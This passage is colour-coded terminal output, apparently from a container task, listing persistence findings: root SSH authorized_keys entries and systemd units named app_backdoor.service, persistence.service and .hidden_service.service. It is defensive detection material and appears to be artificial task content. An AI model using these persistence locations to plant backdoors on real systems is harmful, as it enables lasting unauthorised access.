+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"ssh_key"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/root/.ssh/authorized_keys"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"root"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"ssh_key"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/root/.ssh/authorized_keys"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"root"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m3[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"systemd_unit"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/app_target/etc/systemd/system/app_backdoor.service"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[1;30mnull[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"systemd_unit"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/etc/systemd/system/persistence.service"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[1;30mnull[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"systemd_unit"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/usr/lib/systemd/system/.hidden_service.service"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[1;30mnull[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"systemd_unit"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/usr/lib/systemd/system/kmod-static-nodes.service"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[1;30mnull[0m[1;39m
+  [1;39m}[0m[1;39m
+[1;39m][0m
+[?2004hroot@f34d46d42750:/app# 
